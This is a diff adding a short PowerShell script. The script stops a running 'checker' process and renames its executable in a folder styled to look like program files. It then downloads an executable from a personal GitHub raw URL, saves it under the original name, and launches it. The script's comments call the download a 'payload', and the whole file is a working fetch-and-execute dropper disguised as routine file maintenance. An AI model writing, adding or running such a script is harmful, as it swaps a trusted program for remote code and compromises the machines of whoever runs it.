@@ -1,0 +1,33 @@
+# Define paths and process configurations
+$directory    = "C:\ProgramX64\extentions"
+$processName  = "checker"
+$oldExePath   = Join-Path $directory "checker.exe"
+$newExePath   = Join-Path $directory "finder.exe"
+$downloadUrl  = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/script.exe"
+
+try {
+    # 1. Check if checker.exe is running and stop it safely
+    if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+        Stop-Process -Name $processName -Force
+        # Brief pause to allow the operating system to completely release the file handle
+        Start-Sleep -Seconds 2
+    }
+
+    # 2. Rename the existing checker.exe to finder.exe if it exists
+    if (Test-Path -Path $oldExePath) {
+        # Force removal of old finder.exe if it already exists to prevent duplicate errors
+        if (Test-Path -Path $newExePath) { Remove-Item -Path $newExePath -Force }
+        Rename-Item -Path $oldExePath -NewName "finder.exe" -Force
+    }
+
+    # 3. Download the new script.exe payload as checker.exe
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $oldExePath
+
+    # 4. Execute the newly downloaded checker.exe
+    if (Test-Path -Path $oldExePath) {
+        Start-Process -FilePath $oldExePath
+    }
+}
+catch {
+    Write-Error "An operational error occurred: $_"
+}
